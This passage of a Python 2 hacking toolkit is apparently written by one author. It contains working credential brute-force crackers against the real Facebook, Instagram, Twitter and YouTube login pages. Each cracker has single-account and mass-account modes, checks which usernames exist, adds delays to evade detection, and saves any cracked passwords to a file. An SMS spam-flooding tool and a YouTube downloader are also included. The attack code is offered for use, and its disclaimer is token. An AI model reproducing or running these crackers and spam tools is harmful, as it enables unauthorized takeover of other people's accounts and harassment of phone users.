		o.sendmail(gmail, phone_num, spam_msg)
		sleep(0.004)
		print(phone_num)
		print (color.UNDERLINE + ''+G+'[*] Successfully sent ' + str(counter) + ' Messages!' + color.END)
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		smsatt()	
############################################################################################################################################
def smsatt():
	os.system('clear')
	print ""+O+" "
	print """
		        [+]==============================[+]
		        [+]::::::::Sms Attacker::::::::::[+]
		        [+]==============================[+]
		        +++++++++++++++++++++++++++++++++++++++}
		        [!]------------------------------------}
		        [!]----====-------=----=-----====------}
		        [!]---=----------=-=--=-=---=----------}
		        [!]---=---------=---==---=--=----------}
		        [!]----====----=----==----=--====------}
		        [!]--------=---=-----=----=------=-----}
		        [!]--------=---=----=-----=------=-----}
		        [!]----====----=-----=----=--====------}
		        +++++++++++++++++++++++++++++++++++++++}
		        ========================================
		        Created and Designed by Andrew El+++++++
		        ========================================
		        ***********By Chosing an option*********
		        You recognize and accept the disclaimer+
		        I am not responsible how you use this 
		        software. take great care in using it...
		        """
	print ""+P+" "
	print """
		        +++++++++++++++++++++++++++++++++++++++++++
		        this sms attack will send spam anonomoously
		        (whatever you choose) to target as many times
		        you type in.
		        ++++++++++++++++++++++++++++++++++++++++++++
		        options: s=single target m=mass sms list
		        			t=exit/back to menu
		        ++++++++++++++++++++++++++++++++++++++++++++
		        **************lowercase*********************
		        """
	print ""+C+" "
	option = raw_input('option:')
	option = option.lower()
	if option == 's':
		os.system('clear')
		ssms()
	elif option == 'm':
		os.system('clear')
		msms()	
	elif option == 't':
		os.system('clear')
		der = raw_input('Press Enter to return to menu.. or b to exit:')
		der = der.lower()
		if der == 'b':
			quit()
		else:
			cc()	
	else:
		os.system('clear')
		print ""+R+" "
		print "Sorry Just Type s,m,or t only"
		p = raw_input('Press enter to continue...')
		smsatt()
########################################################################################################################################
########################################################################################################################################
def cc():
	os.system('clear')
	print ""+R+" "
	print '''
	[+]======================================[+]
	[+]Created by Andrew|Communications-crack[+]
	[+]======================================[+]
	[+]These programs will be split between a
	single user attack or userlist attack or a 
	user list attack.
	[1] Gmail
	[2] SMS attack(phone)
	[3] to be determined...
	[99] back to main menu
		
	'''
	opt3 = raw_input('option:')
	if opt3 == '1':
		gmenu()
	elif opt3 == '2':
		smsatt()
	elif opt3 == '99':
		menu()
	else:
		os.system('clear')
		print 'Type in a number corrosponding to the program'
		raw_input("Press enter to continue...")
		cc()
#========================================================================================
def mfb():
	os.system('clear')
	print ""+B+" "
	attempt = 0
	url = 'https://www.facebook.com/login.php'
	print '''
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Multi-User-Facebook-cracker 4.5 | Created by Andrew{}
	{}++++++++++++++++++++++++++++++++++++++++++++++++++++{}
	{ Username or Phone#/Email| p=phon/emaillist u=userlis }
	{}===================================================={}
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		usernamelist = raw_input(color.YELLOW + 'PATH to User-Acount-Lidt:' + color.END)
		usernamelist = open(usernamelist, 'r')
		usernamelist = list(usernamelist)
		for user in usernamelist:
			user = user.strip()
			fbv = requests.get('https://www.facebook.com/' + username)
			if fbv.status_code == 200:
				print username + 'Account Exists!'
			else:
				print username + "Account doesn't exist"
				usernamelist.remove(user)
		print "Marked all non-existing accounts from list"
		raw_input('Press enter to continue....')
		os.system('clear')
		pass
	elif upe == 'p':
		usernamelist = raw_input(color.YELLOW + 'PATH to Phone/Email List:' + color.END)
		usernamelist = open(usernamelist, 'r')
		pass
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		mfb()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passliste = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		mfb()
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfil = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		mfb()
	for username in usernamelist:
		username = username.strip()
		passlist = open(passlistr, 'r')
		for password in passlist:
			password = password.strip()
			attempt = attempt+1
			f = mechanize.Browser()
			f.set_handle_equiv(True)
			f.set_handle_referer(True)
			f.set_handle_robots(False)
			f.addheaders = [('User-Agent', useragent)]
			webres = f.open(url)
			f.form = list(f.forms())[0]
			f.form['email'] = username
			f.form['pass'] = password
			f.method = 'POST'
			response = f.submit()
			f.close()
			r = response.geturl()
			print '[+]===================================[+]'
			print '[+]Facebook-Cracker| Created by Andrew[+]'
			print '[+]+++++++++++++++++++++++++++++++++++[+]'
			
			if r == 'https://www.facebook.com/' or r == 'https://www.facebook.com/checkpoint/?next' or r == 'https://www.facebook.com/?sk=welcome':
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('[+]===================================[+]')
				print(color.GREEN + 'Password Found!' + color.END)
				print color.GREEN + 'Facebook:' + 'Username:' + username + ' Password:' + password + color.END
				outfile = open(outfiler, 'a')
				outfile.write('\n Facebook:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % outfil + color.END
				outfile.close()
				break		
			else:
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
				sleep(6)
		passlist.close()
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		fmenu()	
	
#========================================================================================
def sfb():
	os.system('clear')
	print ""+B+" "
	attempt = 0
	url = 'https://www.facebook.com/login.php'
	print '''
	{}+++++++++++++++++++++++++++++++++++++++++{}
	{} Facebook-cracker 4.5 | Created by Andrew{}
	{}+++++++++++++++++++++++++++++++++++++++++{}
	{ Username or Phone#/Email| p=phone/ u=user }
	{}========================================={}
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		username = raw_input(color.UNDERLINE + 'User-Account:' + color.END)
		fbv = requests.get('https://www.facebook.com/' + username)
		if fbv.status_code == 200:
			print username + '|Account Exists!'
		else:
			os.system('clear')
			print username + "Account doesn't exist!"
			raw_input('Press enter to continue.....')
			sfb()
	elif upe == 'p':
		username = raw_input(color.UNDERLINE + 'Phone_Number/Email' + color.END)
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		sfb()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passlist = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		sfb()
	print('Delay Time between guesses')
	timmer = int(raw_input(color.YELLOW + 'Default is 5' + color.END) or 5)
	print 'Do you wish to save output to file?'
	out = raw_input('yes/no:')
	out = out.lower()
	if out == 'yes':
		outfil = raw_input(color.YELLOW + 'PATH to output:' + color.END)
		try:
			outfil = open(outfil, 'a')
		except:
			os.system('clear')
			print "That file does not exist"
			raw_input('Press enter to continue...')
			sfb()
	elif out == 'no':
		pass
	else:
		os.system('clear')
		print 'Sorry, That is not an option'
		raw_input('Press enter to continue......')
		sfb()
	os.system('clear')
	for password in passlist:
		password = password.strip()
		attempt = attempt+1
		f = mechanize.Browser()
		f.set_handle_equiv(True)
		f.set_handle_referer(True)
		f.set_handle_robots(False)
		f.addheaders = [('User-Agent', useragent)]
		webres = f.open(url)
		f.form = list(f.forms())[0]
		f.form['email'] = username
		f.form['pass'] = password
		f.method = 'POST'
		response = f.submit()
		f.close()
		r = response.geturl()
		print '[+]===================================[+]'
		print '[+]Facebook-Cracker| Created by Andrew[+]'
		print '[+]+++++++++++++++++++++++++++++++++++[+]'
		
		if r == 'https://www.facebook.com/' or r == 'https://www.facebook.com/checkpoint/?next' or r == 'https://www.facebook.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + 'Facebook:' + 'Username:' + username + ' Password:' + password + color.END
			if out == 'yes':
				outfil.write( ' \n Facebook:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % passlistr + color.END
				outfil.close()
			elif out == 'no':
				pass
			der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				fmenu()	
				
		else:
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			if str(attempt) == '10':
				sleep(10)
				os.system('clear')
			else:
				sleep(timmer)
				os.system('clear')	
#========================================================================================
def fmenu():
	os.system('clear')
	print ""+B+" "
	print '''
	[F]=====================================[F]
	[F] Facebook Hacker | Created by Andrew [F]
	[F]-------------------------------------[F]
	[F]single crack hacks one user with list[F]
	[F]=====================================[F]
	[F]mass crack hacks user list with Plist[F]
	[F]=====================================[F]
	
	s = single user crack
	m = mass user crack
	q = quit
	mm = main menu
	'''
	fbm = raw_input('option:')
	fbm = fbm.lower()
	if fbm == 's':
		sfb()
	elif fbm == 'm':
		mfb()
	elif fbm == 'q':
		quit()
	elif fbm == 'mm':
		menu()
	else:
		os.system('clear')
		print 'Sorry, type s for single or m for mass'
		raw_input('Press enter to continue.......')
		fmenu()
#=========================================================================
def ins():
	attempt = 0
	os.system('clear')
	url = 'https://www.instagram.com/accounts/login/?force_classic_login'
	print '''
	{}+++++++++++++++++++++++++++++++++++++++++{}
	{} Instagram-cracker5.0|  Created by Andrew{}
	{}+++++++++++++++++++++++++++++++++++++++++{}
	{ Username or Phone#/Email| p=phone/ u=user }
	{}========================================={}
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		username = raw_input(color.UNDERLINE + 'User-Account:' + color.END)
		fbv = requests.get('https://www.instagram.com/' + username)
		if fbv.status_code == 200:
			print username + '|Account Exists!'
		else:
			os.system('clear')
			print username + "Account doesn't exist!"
			raw_input('Press enter to continue.....')
			ins()
	elif upe == 'p':
		username = raw_input(color.UNDERLINE + 'Phone_Number/Email' + color.END)
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		ins()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passlist = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		ins()
	print('Delay Time between guesses')
	timmer = int(raw_input(color.YELLOW + 'Default is 5' + color.END) or 5)
	print 'Do you wish to save output to file?'
	out = raw_input('yes/no:')
	out = out.lower()
	if out == 'yes':
		outfil = raw_input(color.YELLOW + 'PATH to output:' + color.END)
		try:
			outfil = open(outfil, 'a')
		except:
			os.system('clear')
			print "That file does not exist"
			raw_input('Press enter to continue...')
			ins()
	elif out == 'no':
		pass
	else:
		os.system('clear')
		print 'Sorry, That is not an option'
		raw_input('Press enter to continue......')
		ins()
	os.system('clear')
	for password in passlist:
		password = password.strip()
		attempt = attempt+1
		i = mechanize.Browser()
		i.set_handle_equiv(True)
		i.set_handle_referer(True)
		i.set_handle_robots(False)
		i.addheaders = [('User-Agent', useragent)]
		webres = i.open(url)
		i.form = list(i.forms())[0]
		i.form['username'] = username
		i.form['password'] = password
		i.method = 'POST'
		response = i.submit()
		i.close()
		r = response.geturl()
		print '[+]====================================[+]'
		print '[+]Instagram-Cracker| Created by Andrew[+]'
		print '[+]++++++++++++++++++++++++++++++++++++[+]'
		
		if r == 'https://www.instagram.com/' or r == 'https://www.instagram.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.instagram.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + ' \n Instagram:' + 'Username:' + username + ' Password:' + password + color.END
			if out == 'yes':
				outfil.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % passlistr + color.END
				outfil.close()
			elif out == 'no':
				pass
			der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				fmenu()	
				
		elif r == 'https://www.instagram.com/accounts/login/?force_classic_login':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			if str(attempt) == '10':
				sleep(10)
				os.system('clear')
			else:
				sleep(timmer)
				os.system('clear')	
		else:
			print response.geturl()
			print 'If this signature apears, It means the account may be locked, or unnacccessable by normal means...'
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + ' \n Instagram:' + 'Username:' + username + ' Password:' + password + color.END
			if out == 'yes':
				outfil.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % passlistr + color.END
				outfil.close()
			elif out == 'no':
				pass
			der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				fmenu()	
			
			
#=========================================================================
def imn():
	os.system('clear')
	print ""+O+" "
	attempt = 0
	url = 'https://www.instagram.com/accounts/login/?force_classic_login'
	print '''
	{}+++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Instagram-cracker5.0|  Created by Andrew        {}
	{}+++++++++++++++++++++++++++++++++++++++++++++++++{}
	{ Username or Phone#/Email| p=phone/list u=userlist }
	{}================================================={}
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		usernamelist = raw_input(color.YELLOW + 'PATH to User-Acount-Lidt:' + color.END)
		usernamelist = open(usernamelist, 'r')
		usernamelist = list(usernamelist)
		for user in usernamelist:
			user = user.strip()
			fbv = requests.get('https://www.instagram.com/' + user)
			if fbv.status_code == 200:
				print user + 'Account Exists!'
			else:
				print user + "Account doesn't exist"
				usernamelist.remove(user)
		print "Marked all non-existing accounts from list"
		raw_input('Press enter to continue....')
		os.system('clear')
		pass
	elif upe == 'p':
		usernamelist = raw_input(color.YELLOW + 'PATH to Phone/Email List:' + color.END)
		usernamelist = open(usernamelist, 'r')
		pass
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		imn()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passliste = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		imn()
	print('Delay Time between guesses')
	timmer = int(raw_input(color.YELLOW + 'Default is 5' + color.END) or 5)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfile = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		imn()
	for username in usernamelist:
		username = username.strip()
		passlist = open(passlistr, 'r')
		outfil = open(outfiler, 'a')
		for password in passlist:
			password = password.strip()
			attempt = attempt+1
			i = mechanize.Browser()
			i.set_handle_equiv(True)
			i.set_handle_referer(True)
			i.set_handle_robots(False)
			i.addheaders = [('User-Agent', useragent)]
			webres = i.open(url)
			i.form = list(i.forms())[0]
			i.form['username'] = username
			i.form['password'] = password
			i.method = 'POST'
			response = i.submit()
			i.close()
			r = response.geturl()
			print '[+]====================================[+]'
			print '[+]Instagram-Cracker| Created by Andrew[+]'
			print '[+]++++++++++++++++++++++++++++++++++++[+]'
			
			if r == 'https://www.instagram.com/' or r == 'https://www.instagram.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.instagram.com/?sk=welcome':
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('[+]===================================[+]')
				print(color.GREEN + 'Password Found!' + color.END)
				print color.GREEN + ' \n Instagram:' + 'Username:' + username + ' Password:' + password + color.END
				outfil.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % passlistr + color.END
				outfil.close()
				break
					
			elif r == 'https://www.instagram.com/accounts/login/?force_classic_login':
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
				if attempt == '10':
					sleep(10)
					os.system('clear')
				else:
					sleep(timmer)
					os.system('clear')	
			else:
				print response.geturl()
				print 'If this signature apears, It means the account may be locked, or unnacccessable by normal means...'
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('[+]===================================[+]')
				print(color.GREEN + 'Password Found!' + color.END)
				print color.GREEN + ' \n Instagram:' + 'Username:' + username + ' Password:' + password + color.END
				outfil.write('\n Instagram:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % passlistr + color.END
				outfil.close()
				break
				
	der = raw_input('Press Enter to return to menu.. or b to exit:')
	der = der.lower()
	if der == 'b':
		quit()
	else:
		imenu()	
#==============================================================================================================================f
def imenu():
	os.system('clear')
	print ""+O+" "
	print '''
	[I]=====================================[I]
	[I] Instagram-Hacker| Created by Andrew [I]
	[I]=====================================[I]
	[I]Single-crack hacks one user at a time[I]
	[I]Mass-crack uses a userlist with Plist[I]
	[I]=====================================[I]
	
	s = single-user-crack
	m = mass-user-crack
	q = quit
	mm = main menu
 	'''
 	minst = raw_input('option:')
 	minst = minst.lower()
 	if minst == 's':
 		ins()
 	elif minst == 'm':
 		imn()
 	elif minst == 'q':
 		quit()
 	elif minst == 'mm':
  		menu()
 	else:
		os.system('clear')
		print 'Sorry, type s for single or m for mass'
		raw_input('Press enter to continue.......')
		imenu()
#=========================================================================
def ts():
	attempt = 0
	url = 'https://m.twitter.com/login/'
	print ""+C+" "
	os.system('clear')
	print'''
	[I]========================================[I]
	[I] Twitter-Cracker 7.1| Created by Andrew [I]
	[I]========================================[I]
	[I]Username or Phone/Email| u= user p=phone[I]
	[I]++++++++++++++++++++++++++++++++++++++++[I]
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		username = raw_input(color.UNDERLINE + 'User-Account:' + color.END)
		fbv = requests.get('https://www.twitter.com/' + username)
		if fbv.status_code == 200:
			print username + '|Account Exists!'
		else:
			os.system('clear')
			print username + "Account doesn't exist!"
			raw_input('Press enter to continue.....')
			ts()
	elif upe == 'p':
		username = raw_input(color.UNDERLINE + 'Phone_Number/Email' + color.END)
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		ts()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passlist = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		ts()
	print('Delay Time between guesses')
	timmer = int(raw_input(color.YELLOW + 'Default is 5' + color.END) or 5)
	print 'Do you wish to save output to file?'
	out = raw_input('yes/no:')
	out = out.lower()
	if out == 'yes':
		outfil = raw_input(color.YELLOW + 'PATH to output:' + color.END)
		try:
			outfil = open(outfil, 'a')
		except:
			os.system('clear')
			print "That file does not exist"
			raw_input('Press enter to continue...')
			ts()
	elif out == 'no':
		pass
	else:
		os.system('clear')
		print 'Sorry, That is not an option'
		raw_input('Press enter to continue......')
		ts()
	os.system('clear')
	for password in passlist:
		password = password.strip()
		attempt = attempt+1
		t = mechanize.Browser()
		t.set_handle_equiv(True)
		t.set_handle_referer(True)
		t.set_handle_robots(False)
		t.addheaders = [('User-Agent', useragent)]
		webres = t.open(url)
		t.form = list(t.forms())[0]
		t.form['session[username_or_email]'] = username
		t.form['session[password]'] = password
		t.method = 'POST'
		response = t.submit()
		t.close()
		r = response.geturl()
		print '[+]====================================[+]'
		print '[+]Twitter-Cracker5 | Created by Andrew[+]'
		print '[+]++++++++++++++++++++++++++++++++++++[+]'
		
		if r == 'https://www.twitter.com/' or r == 'https://mobile.twitter.com/' or r == 'https://www.twitter.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.twitter.com/?sk=welcome':
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('[+]===================================[+]')
			print(color.GREEN + 'Password Found!' + color.END)
			print color.GREEN + ' \n Twitter:' + 'Username:' + username + ' Password:' + password + color.END
			if out == 'yes':
				outfil.write('\n Twitter:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % outfil + color.END
				outfil.close()
			elif out == 'no':
				pass
			der = raw_input('Press Enter to return to menu.. or b to exit:')
			der = der.lower()
			if der == 'b':
				quit()
			else:
				tmenu()	
				
		else:
			print response.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % passlistr
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
			if str(attempt) == '10':
				sleep(10)
				os.system('clear')
			else:
				sleep(timmer)
				os.system('clear')		
#=====================================================================
def mt():
	os.system('clear')
	print ""+C+" "
	attempt = 0
	url = 'https://m.twitter.com/login/'
	print '''
	{}+++++++++++++++++++++++++++++++++++++++++++++++++{}
	{} Twitter-cracker 5.0 |  Created by Andrew        {}
	{}+++++++++++++++++++++++++++++++++++++++++++++++++{}
	{ Username or Phone#/Email| p=phone/list u=userlist }
	{}================================================={}
	'''
	upe = raw_input('option:')
	upe = upe.lower()
	if upe == 'u':
		usernamelist = raw_input(color.YELLOW + 'PATH to User-Acount-List:' + color.END)
		usernamelist = open(usernamelist, 'r')
		usernamelist = list(usernamelist)
		for user in usernamelist:
			user = user.strip()
			fbv = requests.get('https://www.twitter.com/' + user)
			if fbv.status_code == 200:
				print user + 'Account Exists!'
			else:
				print user + "Account doesn't exist"
				usernamelist.remove(user)
		print "Marked all non-existing accounts from list"
		raw_input('Press enter to continue....')
		os.system('clear')
		pass
	elif upe == 'p':
		usernamelist = raw_input(color.YELLOW + 'PATH to Phone/Email List:' + color.END)
		usernamelist = open(usernamelist, 'r')
		pass
	else:
		os.system('clear')
		print 'Not an Option'
		raw_input('Press enter to continue.....')
		mt()
	passlistr = raw_input(color.YELLOW + 'PATH to wordlist:' + color.END)
	try:
		passliste = open(passlistr, 'r')
	except:
		os.system('clear')
		print 'List does not exist, or you mistyped'
		raw_input('Press Enter to continue...')
		mt()
	print('Delay Time between guesses')
	timmer = int(raw_input(color.YELLOW + 'Default is 5' + color.END) or 5)
	outfiler = raw_input(color.YELLOW + 'PATH to output:' + color.END)
	try:
		outfile = open(outfiler, 'a')
	except:
		os.system('clear')
		print "That file does not exist"
		raw_input('Press enter to continue...')
		mt()
	for username in usernamelist:
		username = username.strip()
		passlist = open(passlistr, 'r')
		outfil = open(outfiler, 'a')
		for password in passlist:
			password = password.strip()
			attempt = attempt+1
			t = mechanize.Browser()
			t.set_handle_equiv(True)
			t.set_handle_referer(True)
			t.set_handle_robots(False)
			t.addheaders = [('User-Agent', useragent)]
			webres = t.open(url)
			t.form = list(t.forms())[0]
			t.form['session[username_or_email]'] = username
			t.form['session[password]'] = password
			t.method = 'POST'
			response = t.submit()
			t.close()
			r = response.geturl()
			print '[+]====================================[+]'
			print '[+]Twitter-Cracker5 | Created by Andrew[+]'
			print '[+]++++++++++++++++++++++++++++++++++++[+]'
		
			if r == 'https://www.twitter.com/' or r == 'https://mobile.twitter.com/' or r == 'https://www.twitter.com/mobileprotection?source=mobile_mirror_nux' or r == 'https://www.twitter.com/?sk=welcome':
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('[+]===================================[+]')
				print(color.GREEN + 'Password Found!' + color.END)
				print color.GREEN + ' \n Twitter:' + 'Username:' + username + ' Password:' + password + color.END
				outfil.write('\n Twitter:' + 'Username:' + username + 'Password:' + password)
				print color.GREEN + 'File Saved at %s' % outfiler + color.END
				outfil.close()

					
			else:
				print response.geturl()
				print('{Username:%s}') % username
				print('{Wordlist:%s}') % passlistr
				print('{Password:%s}') % password
				print('{Pass Attempt:%s}') % str(attempt)
				print('============================')
				print(color.RED + 'Password Incorrect| ' + color.GREEN + password + color.END)
				if str(attempt) == '10':
					sleep(10)
					os.system('clear')
				else:
					sleep(timmer)
					os.system('clear')
	der = raw_input('Press enter to continue to menu, b for exit')
	if der == 'b':
		quit()
	else:
		tmenu()
#=========================================================================
def tmenu():
	os.system('clear')
	print ""+C+" "
	print '''
	[I]=====================================[I]
	[I] Twitter-Hacker  | Created by Andrew [I]
	[I]=====================================[I]
	[I]Single-crack hacks one user at a time[I]
	[I]Mass-crack uses a userlist with Plist[I]
	[I]=====================================[I]
	
	s = single-user-crack
	m = mass-user-crack
	q = quit
	mm = main menu
 	'''
 	mtwit = raw_input('option:')
 	mtwit = mtwit.lower()
 	if mtwit == 's':
 		ts()
 	elif mtwit == 'm':
 		mt()
 	elif mtwit == 'q':
 		quit()
 	elif mtwit == 'mm':
  		menu()
 	else:
		os.system('clear')
		print 'Sorry, type s for single or m for mass'
		raw_input('Press enter to continue.......')
		tmenu()
#========================================================================
def single():
	os.system('clear')
	print('-------------------------')
	print('copy and paste link below')
	print('-------------------------')
	lister = raw_input(':')
	os.system('clear')
	print '############################'
	print 'Copy/write output file below'
	print '############################'
	output = raw_input(':')
	yt = pytube.YouTube(lister)
	stream = yt.streams.first()
	stream.download(output)
	print ('Done with %s' % yt.title)
	der = raw_input('Press enter to continue to menu, b for exit')
	if der == 'b':
		quit()
	else:
		mainlo()
##############################################################################
def youlobe():
	os.system('clear')
	print '============================='
	print 'Drag and drop file list here:'
	print '============================='
	lister = raw_input(':')
	lister = open(lister, 'r')
	print 'Drag output file here' 
	output = raw_input(':')
	for link in lister:
	   	link = link.strip()
		yt = pytube.YouTube(link)
		stream = yt.streams.first()
		stream.download(output)
		print ('Done with %s' % yt.title)

	der = raw_input('Press enter to continue to menu, b for exit')
	if der == 'b':
		quit()
	else:
		mainlo()
##############################################################################
    
def mainlo():
	print '''
	[+]============================[+]
	[+]Andrew's Youtube Downlaoder [+]
	[+]============================[+]
	use responsibly
	I am in no legal way responsible how you use this program
	Do you want:

	[1] Single file download.
	[2} text file download..
	single file downlaod allows you to paste the youtube link
	and download that one video.
	text file download allows you to drag text file with multiple
	links and download each one to an output file.

	s = single, t = textfile, e = exit/menu
	'''
	print 'https://audio.online-convert.com/convert-to-mp3'
	option = raw_input('option:')
	option = option.lower()
	if option == 's':
		single()
	elif option == 't':
		youlobe()
	elif option == 'e':
		der = raw_input('Press enter to continue to menu, b for exit')
		if der == 'b':
			quit()
		else:
			ymenu()
	else:
		print 'sorry, wrong option.'
		b = raw_input('Press enter to continue....')
		os.system('clear')
		mainlo()
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
def youtubecrack():
	os.system('clear')
	print ""+B+" "
	print '''
	[+]========================[+]
	[+]Youtube-Account| Cracker[+]
	[+]========================[+]
	'''
	attempt = 0
	username = raw_input(color.RED + 'Username/Email:' + color.BLUE)
	lister = raw_input(color.RED + 'PATH to password list:' + color.RED)
	print 'Number of seconds between attempts: helps avoid suspicion from programs'
	timerel = int(raw_input('Default is 3:') or 3)
	lister = open(lister, 'r')
	for password in lister:
		username = username.strip()
		password = password.strip()
		b = mechanize.Browser()
		res = b.open('https://www.youtube.com/signin')
		b.set_handle_robots(False)
		b.select_form(nr=0)
		b.form['Email'] = username
		ier = b.submit()
		attempt = attempt + 1
		password = password.strip()
		b.select_form(nr=0)
		b.form['Passwd'] = password
		er = b.submit()
		b.close()
		print '''
		[+]=========================[+]
		[+]Youtube-Cracker|Andrew-el[+]
		[+]=========================[+]
		'''
		print er.geturl()
		if er.geturl() == 'https://www.youtube.com/':
			os.system('clear')
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % lister
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print('Success!, Password Found| ' + color.GREEN + password + color.END)
			outil = raw_input('Do you want to save output?(yes/no)')
			outil.lower()
			outil = outil.strip()
			if outil == 'yes':
				pather = raw_input('PATH to output:')
				pather = open(pather, 'a')
				pather.write('\n' + 'YouTube:' + 'Username: ' + username + ' Password:' + password + 'Attempt:' + str(attempt))
				print'Done!'
				der = raw_input('Press enter to continue to menu, b for exit')
				if der == 'b':
					quit()
				else:
					yourobe()
			elif outil == 'no':
				der = raw_input('Press enter to continue to menu, b for exit')
				if der == 'b':
					quit()
				else:
					youtubecrack()
			else:
				print('oops! you typed something wrong')
				break
		else:
			os.system('clear')
			print er.geturl()
			print('{Username:%s}') % username
			print('{Wordlist:%s}') % lister
			print('{Password:%s}') % password
			print('{Pass Attempt:%s}') % str(attempt)
			print('============================')
			print(color.PURPLE + password + ' Does not work.')
			print('Next....')
			if str(attempt) == '10':
